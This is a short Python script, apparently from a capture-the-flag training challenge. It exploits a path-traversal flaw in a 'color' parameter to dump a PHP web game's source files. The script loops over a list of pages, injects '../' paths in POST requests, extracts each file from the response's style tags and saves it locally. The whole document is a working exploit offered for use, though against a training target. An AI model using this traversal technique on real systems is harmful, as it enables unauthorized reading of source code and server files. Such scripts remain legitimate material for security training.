#This code exploit the vulnerability that allows us to dump the source code of the challenge.
#This code has been gently offered by Buba98 (nickname on github)

import requests
import os

pages = ['index.php', 'viewer.php', 'history.php', 'innerGame.php', 'replay.php', 'game.php', 'css/blue.css', 'css/orange.css',
         'js/jquery-2.1.1.min.js', 'js/hammer.js', 'js/script.js', 'js/axios.min.js', 'js/scriptViewer.js',
         'icons/ico.png', 'games/ranking']

URL = 'http://1024.training.jinblack.it'


def page_retrieve(is_print=False):
    for page in pages:
        url = '%s/?color=../%s' % (URL, page)
        r = requests.post(url)

        php = r.text.split('<style>', 1)[1]

        php = php.rsplit('</style>', 1)[0]

        filename = f'dump/{page}'
        os.makedirs(os.path.dirname(filename), exist_ok=True)

        f = open(filename, "w")
        f.write(php)
        f.close()

        if is_print:
            print(php)


page_retrieve()